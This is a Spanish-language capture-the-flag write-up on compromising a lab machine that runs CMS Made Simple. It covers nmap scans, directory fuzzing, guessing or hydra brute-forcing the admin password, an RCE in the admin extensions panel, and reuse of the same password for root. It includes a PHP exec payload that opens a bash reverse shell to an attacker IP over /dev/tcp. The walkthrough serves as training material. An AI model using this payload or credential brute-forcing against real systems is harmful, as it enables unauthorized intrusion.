- Tags: #cmsMadeSimple #hydra #fuerzaBruta 
______
comenzamos la maquina escaneando la IP con nmap.

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn 172.17.0.2 -oG allport
```

para después escanear los puertos reportados como abiertos con la finalidad de conocer la versión y servicio de dichos puertos.

```shell
nmap -p <puertos_Abiertos> <direccion_ip> -sCV -oN target
```

obtenemos lo siguiente.
___
![](attachment/db74e909878a72c2d885ced78db88aa2.png)
___
tenemos el puerto 80 (http) y 22 (ssh) abiertos, por lo que ahora veremos que encontramos en la pagina web.
______
![](attachment/61b302af76868d492de4574d6d209c81.png)
______
tenemos un apache2 recien instalado, por lo que aplicaremos fuzzing para ver que directorios tenemos.
____
![](attachment/b3ae3010aafa54602ef3d70e0b7f5f04.png)
____
no encontramos nada que nos pueda servir por lo que investigaremos el código fuente para ver que encontramos.
____
![](attachment/dfb7898a08cbe3da7adfa8f6f2101b2f.png)
___
tenemos lo que parece ser una ruta /cmsms, probemos en la url.
____
![](attachment/9762b4c75eb8a1087f47f44c4167001b.png)
______
tenemos otra web la cual, investiguemos el entorno y veamos que encontramos.
_____
![](attachment/698a334f335fd96199fee18bb5f08ba9.png)
____
obtenemos la versión de CMS, si buscamos vulnerabilidades la mayoría tiene como requisito estar autenticado en la web, por lo que debe de haber un panel de login.

apliquemos fuzzing y veamos que nos reporta.
_____
![](attachment/881c5e36d4f553ff8bc01232bd44bdbe.png)
____
encontramos el panel de login, podemos acceder y probar credenciales por defecto.
______
![](attachment/7248e94481cf27b7b9368f97344d1acf.png)
_____
probando credenciales como admin:admin nos denegaba la entrada, pero recordé un patrón muy importante y es que esta maquina fue creada por el pinguino de mario y tras haber realizado varias maquina del anteriormente mencionado, existe un patrón conocido y es que casi todas sus contraseña son chocolate por lo que no podía faltar probar admin:chocolate.
______
![](attachment/7c2e9df62837b644d6bd8137a56c2dae.png)
______
no podía creer que había funcionado.

también existe otra forma de obtener la credencial, podemos aplicar fuerza bruta con hydra al panel de login, usando BurpSuite para capturar la petición y poder extraer los valores necesarios para poder aplicar la fuerza bruta.

la datos son:

1) ruta donde se encuentra el panel de login
2) los valores que componen el panel de login
3) el error que arroja el panel de login cuando las credenciales son incorrectas.
_____
![](attachment/4bc3eea1886493ea29802c64b613ca89.png)
_____
y de esta forma obtenemos las credenciales, ahora podemos recurrir a las vulnerabilidades registradas para la versión del CMS y ver que logramos.

yo puede explotar un RCE siguiendo los pasos que me dio un fichero .txt al buscar con searchsploit.
______
![](attachment/e08ea2ddde6fc92829ddb0191cb5c20e.png)
_____
aunque es de una versión anterior funciono perfectamente, aquí su contenido.
_____
![](attachment/2cc1c8c410125aa663cb8c1e39964353.png)
______
nos dice que la vulnerabilidad se encuentra en panel de administrador, en el apartado de extensiones.
____
![](attachment/12ea3f0bac379e0a82cbc10cb29bd88d.png)
_____
si accedemos ahí encontraremos un apartado que nos permite ejecutar código.
____
![](attachment/68e87bbf338cab1affcc6ad1e99b862d.png)
_____
podemos borrar su contenido para agregar el siguiente payload.

```shell
exec("/bin/bash -c 'bash -i > /dev/tcp/192.168.56.1/4444 0>&1'");
```

se configura según tu IP y puerto, una vez configurado debemos de darle al botón de run para que se ejecute el código, de esta forma podremos ganar acceso a la maquina.

también existe otra forma de hacerlo y podemos encontrar la referencia en la siguiente pagina.

web: https://packetstormsecurity.com/files/177241/CMS-Made-Simple-2.2.19-2.2.21-Remote-Code-Execution.html

ya que sabemos como explotar la vulnerabilidad podemos seguir con la post-explotación.

accedemos a la maquina y aplicamos el tratamiento de la tty y procedemos a realizar reconocimiento del sistema.

tenemos un usuario cms, también tenemos acceso a una base de datos.
_____
![](attachment/48cdac322f46a916edb122cb6e26d2e7.png)
______
para pivotar al usuario root podemos utilizar un script del pinguino de mario que nos permite realizar un ataque de fuerza bruta a los usuarios del sistema.

pero como ya conté al inicio de este reporte, mario tiene un patrón para sus contraseñas por lo que si usamos chocolate como contraseña para root podremos convertirnos en root con éxito  
____
![](attachment/dbe2c13eca291a256f3aef37d940426c.png)
____




